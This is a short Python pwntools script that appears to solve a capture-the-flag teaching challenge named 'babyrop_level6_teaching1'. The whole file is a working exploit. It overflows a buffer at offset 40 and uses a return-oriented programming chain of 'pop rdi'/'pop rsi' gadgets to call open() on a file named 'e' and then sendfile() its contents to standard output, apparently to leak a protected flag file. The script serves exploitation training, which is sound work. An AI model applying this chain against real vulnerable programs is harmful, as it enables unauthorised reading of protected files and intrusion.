#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = '/babyrop_level6_teaching1'
r = ROP(context.binary)
e = ELF('/babyrop_level6_teaching1')
#p = gdb.debug(['./babyrop_level6_teaching1'], 'b *read')
p = process('/babyrop_level6_teaching1')
p.clean()
getGadget = lambda x: p64(r.find_gadget(x).address)
#open("e", 0)
chain = getGadget(['pop rdi', 'ret'])
chain += p64(e.search(b'e\x00').__next__())
chain += getGadget(['pop rsi', 'ret'])
chain += p64(0x0)
chain += p64(e.sym['open'])
# sendfile(1, 3, 0, 40)
r.call(e.sym['sendfile'], [1, 3, 0, 100])
p.sendline(fit({40:chain+r.chain()}))
#p.close()
p.interactive()